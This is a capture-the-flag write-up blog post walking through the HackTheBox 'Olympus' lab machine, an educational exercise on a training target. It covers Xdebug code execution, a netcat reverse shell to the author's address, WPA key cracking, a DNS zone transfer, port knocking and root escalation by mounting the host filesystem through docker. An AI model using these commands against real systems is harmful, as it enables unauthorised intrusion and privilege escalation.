---
published: true
---

<center><h1><b>HackTheBox Olympus Writeup</b></h1></center>

This is a writeup for the machine olympus from HackTheBox and also my first security blogpost.<br>
  **Lets get started** 

## Step 1: Initial Recon<br>

So now lets perform a nmap scan on the host ip which is 10.10.10.83. The nmap command is given below:<br>
    `nmap -sC -sv -oA default -n 10.10.10.83`
<br>The scan output from nmap is shown below:<br>
![1](https://fir3wa1-k3r.github.io/imgs/olymupus_1.png)

As we see it has 3 open ports and one filtered port.

`22/tcp		filtered	ssh`<br>
`53/tcp		open		domain`<br>
`80/tcp		open		http`<br>
`2222/tcp	open		ssh`<br>

Here the port 22 is being filtered which means that nmap is unable to find out whether the port is open or not. And port 53 which has to be using UDP protocol is now using TCP, there is something fishy here, lets get to it later.
Here is the image from the website when we check out the http service on the host
<br>
<p align="center">
  <img width="460" height="500" src="https://fir3wa1-k3r.github.io/imgs/olympus_2.png">	
</p>

And concurrently when we run gobuster for directory bruteforcing that resulted in the `index.php` page which is the redirection to the original homepage.<br>
After performing a stego analysis on the images i found nothing. Then i jumped to analyse the response from the web server.Then by looking into the header `Xdebug: 2.5.5`, we can get to know that Xdebug is enabled in the server, which can allow remote debugging facility for developers.<br>
> For more info about XDebug check [here](https://xdebug.org/docs/).

<p align="center">
  <img width="656" height="398" src="https://fir3wa1-k3r.github.io/imgs/olympus_3.png">	
</p>

Hence we can utilize this service to get initial foothold in the machine. The service can be exploited by sending the specially crafted http request to the server to connect back to port 9000. Then we can get Remote Code Execution using the eval function in php.

> For more information about exploiting the Xdebug service please visit [here](https://paper.seebug.org/397/)

<p align="center">
  <img width="1000" height="255" src="https://fir3wa1-k3r.github.io/imgs/olympus_4.png">	
</p>

We can also see that the `XDEBUG_SESSION` cookie is being set by the server and it enable us to utilize the feature of remote debugging. Hence we can potentially exploit the service using eval funtion.<br>

<p align="center">
  <img width="656" height="398" src="https://fir3wa1-k3r.github.io/imgs/olympus_5.png">
</p>

I have written a simple python script which sends the payload to the server which then executes code. Now we have RCE(Remote Code Execution) on the server.

<p align="center">
  <img width="750" height="273" src="https://fir3wa1-k3r.github.io/imgs/olympus_6.png">
</p>
As we enumerate through the web server we see that it doesn't have python installed. So one of the way to get a shell is through netcat in which the -e switch is allowed in this machine. We received a low privileged shell using the following command:<br>
`nc -e /bin/sh <my_IP> <port>`<br>
After enumerating for a some time i found user zeus on the box. So i navigated to the users' home directory. Then i found a file called captured.pcap in `/home/zeus/airgeddon/captured/` directory.Then transfered that file into my machine using base64 transfer technique (will be breifly introducing the methods to transfer files in the upcoming posts). By doing a `file` command on the .cap file we see the following output:<br>
<p align="center">
  <img width="900" height="18" src="https://fir3wa1-k3r.github.io/imgs/olympus_7.png">
</p>

Looks like its a packet capture file. When we open this caputure file in `Wireshark` we see a lot of deauth and handshake frames and as we carefully examine through the file in Wireshark we can actually see something about BSSID and it was mentioned as `Too_cl0se_to_th3_Sun`. Then i got to know that its some kind of wireless WPA capture file using which i can crack the WPA keys.<br>
So i fired up my **aircrack-ng**<br>

`$aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt`

Which took me around 20 mins to crack the WPA key according to my system specs. And finally the key was:<br>

<p align="center">
  <img width="294" height="30" src="https://fir3wa1-k3r.github.io/imgs/olympus_8.png">
</p>

After this step, there is a little bit of guessing required for the ssh user. Hence according to the WPA passphrase we should guess the user for the ssh was icarus.

> The machine was also vulnerable for ssh user enumeration vulnerability. For more information please check [here](https://www.exploit-db.com/exploits/45233/)<br>

Now we login into ssh as the user icarus using `$ssh icarus@10.10.10.83 -p 2222` with the password `Too_cl0se_to_th3_Sun`. As we get into the machine and enumerate the files in the home directory we can see a file called `help_of_the_gods.txt` which showed us the whole new path towards conquering this machine.<br>

<p align="center">
  <img width="654" height="305" src="https://fir3wa1-k3r.github.io/imgs/olympus_9.png">
</p>

This text file mentioned something about the domain `ctfolympus.htb`. So i went on and added this domain to my host file which is located in `/etc/hosts`<br>
{% highlight ruby %}
127.0.0.1		localhost		
10.10.10.83		ctfolympus.htb		#This one
{% endhighlight %}
<br>
As we saw that DNS service was using TCP for its transmission, we probably can perform a **DNS Zone Transfer**.
Hence i performed a DNS zone transfer using this command:<br>
`$dig axfr @10.10.10.83 ctfolympus.htb`
<br>
`dig` is an awesome tool which can perform some DNS related stuff like query the DNS servers for records and even for network troubleshooting.

<p align="center">
  <img width="1100" height="411" src="https://fir3wa1-k3r.github.io/imgs/olympus_10.png">
</p>
<br>
Now when we carefully analyse the output, we can see some sequence of number i.e `Hades (3456 8234 62431)` and some string `St34l_th3_F1re!`. The string somewhat looks like a password and the sequence looks like ports numbers. And i guessed it that it could be through a port knocking method i can open the filtered ssh port which is 22.

> If you don't know what Port Knocking is, you can check [here](https://en.wikipedia.org/wiki/Port_knocking) and [here](http://www.portknocking.org/) also
<br>

To perform a port knocking i wrote a simple shell script which connects to the server in the specified sequence and then opens the **secret port**. This can also be done using knockd program in linux. <br>

<p align="center">
  <img width="674" height="57" src="https://fir3wa1-k3r.github.io/imgs/olympus_11.png">
</p>
<br>
And as we saw in the DNS zone transfer output, the user `prometheus` was specified. And when we run the port knocking shell script the port 22 opens for a few second and then closes back again. When the port 22 opened initially i tried with the username as Hades and password as the string mentioned in the ouput of zone transfer but that was a fail attempt(as ssh username is always in small letters). Later when i tried loging in as prometheus with the same password that allowed me inside.
<br>
<p align="center">
  <img width="688" height="570" src="https://fir3wa1-k3r.github.io/imgs/olympus_12.png">
</p>
<br>
Got the user flag in the home directory!!<br>

<p align="center">
  <img width="374" height="43" src="https://fir3wa1-k3r.github.io/imgs/olympus_13.png">
</p>

Now i started enumerating to escalate my privileges. I ran the `LinEnum.sh` script and went through the result. There were many network interfaces and actually there was a docker program installed on this machine. Each user i.e zues, prometheus were being run in the docker, hence they were virtually isolated from the original system.
<br>
<p align="center">
  <img width="409" height="41" src="https://fir3wa1-k3r.github.io/imgs/olympus_14.png">
</p>
<br>
> If you want to know more about docker, check [here](https://searchitoperations.techtarget.com/definition/Docker)<br>

If the current user is a member of docker group then its a way more easy to get root in the machine. As we use `groups` command we can see that user prometheus is a member of docker group. We can also see what container images are running in the system currently. This can be done using the command:<br>
`docker images` or `docker container ls`
<br>
<p align="center">
  <img width="855" height="95" src="https://fir3wa1-k3r.github.io/imgs/olympus_15.png">
</p>
<br>
The privesc is very easy in this machine. This is just one command which can give you root shell:<br>
`$docker run -it crete bash`<br>
The i and t switch will give you the interactive tty shell running as the root.<br>
<p align="center">
  <img width="855" height="95" src="https://fir3wa1-k3r.github.io/imgs/olympus_16.png">
</p>
It can also be performed mounting the root file system into some directory and then reading the root.txt file.<br>
`$docker run -v /:/mnt/MountDirectory -it crete bash`<br>
Then it mounts the root file system into the directory `/mnt/MountDirectory/` and hence you can get read the root.txt file.

##I would like to thank my buddy payload, Teck_K2 and ippsec and many others for helping and supporing me.


Thats it, hope you enjoyed it.<br>
**Thanks for reading, STAY TUNED..!!!**











